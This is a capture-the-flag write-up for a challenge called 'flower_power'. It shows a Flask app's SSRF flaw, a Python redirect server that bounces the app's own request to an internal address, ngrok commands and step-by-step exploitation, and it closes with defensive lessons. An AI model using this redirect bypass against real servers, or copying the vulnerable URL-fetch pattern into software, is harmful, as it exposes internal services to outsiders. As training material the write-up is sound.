# 🏵️ flower_power

## 📦 Challenge Setup

Generate a dummy `flag.png`:

```bash
docker build -t flower_power .
docker run -p 8080:80 flower_power
```

---

## 🧾 Description
Find Special flower!

---

## 🧠 Background Knowledge

### 🔒 Internal IP Filtering

The server only serves `flag.png` to clients with **internal IP addresses**:

- `127.0.0.0/8`
- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`

External requests return `"Unauthorized access"`.

---

### 🌐 SSRF (Server-Side Request Forgery)

If the server makes a request **on behalf of the user**, it uses its **own IP**, which is considered internal.

We can abuse this behavior to bypass IP restrictions:

```
[You] --> [filter_flower input] --> [Server] --(SSRF)--> /special_flower
```

---

## 🔍 Vulnerability Analysis

### Target: `/special_flower`

```python
@app.get("/special_flower")
def special_flower():
    if not request.remote_addr:
        return "Unauthorized access"
    r_ip = ipaddress.ip_address(request.remote_addr)
    if r_ip in internal_ranges:
        return send_file("flag.png", mimetype='image/png')
    return "Unauthorized access"
```

Accessible **only from internal IPs**.

---

### Entry Point: `/filter_flower` (SSRF Injection)

```python
@app.post('/filter_flower')
def filter_flower():
    flower_url = request.form['flower_url']
    
    # Parse domain and resolve DNS
    ip = resolve(domain)
    
    # Block internal IPs
    if ip in internal_range:
        return "Definitely not a flower!"
    
    # SSRF vulnerability here:
    r = requests.get(flower_url)
```

💥 If we control `flower_url`, we can trigger a **server-side request** to `http://127.0.0.1/special_flower`.

❗ BUT: there's a DNS-based IP check, so we can't just use "localhost" or "127.0.0.1".

---

## 🧨 Exploitation Strategy

### Problem

Direct SSRF to `127.0.0.1` or `localhost` fails due to DNS resolution and IP filtering.

### Solution

Use **open redirect** hosted on your own server that **points to internal address**, and bypass IP filtering using the **server's request chain**.

---

## 🧪 Exploit Code (Redirect Server)

```python
# redirect_server.py
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redir():
    return redirect("http://192.168.64.10:8080/special_flower", code=302)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8081)
```

### 1. Start redirect server

```bash
python redirect_server.py
```

### 2. Expose to the internet using ngrok

```bash
ngrok http 8081
```

You’ll get a public URL like:

```
https://abcdef1234.ngrok.io/redirect
```

---

## 🚀 Final Exploit

### Steps:

1. Go to `http://target/filter_flower`
2. Input your **ngrok URL** in the flower URL field:
   ```
   https://abcdef1234.ngrok.io/redirect
   ```
3. Server will:
   - Fetch `https://abcdef1234.ngrok.io/redirect`
   - Follow redirect to internal address
   - Bypass IP filtering
4. Result: **You get the flag!**

---

## 🎯 Takeaways

- ✅ SSRF → Internal resource access
- ✅ `requests.get()` follows **302 redirects by default**
- ✅ Use external redirection to **bypass internal IP filtering**
- ⚠️ `0.0.0.0` is often not resolvable in DNS → use internal IP directly in redirection

---

## 🧠 Lessons Learned

- Don’t trust external URLs even if DNS is resolved and filtered
- SSRF redirection chains can bypass naive filters
- Defense should verify final hop IP, not just the DNS of the input
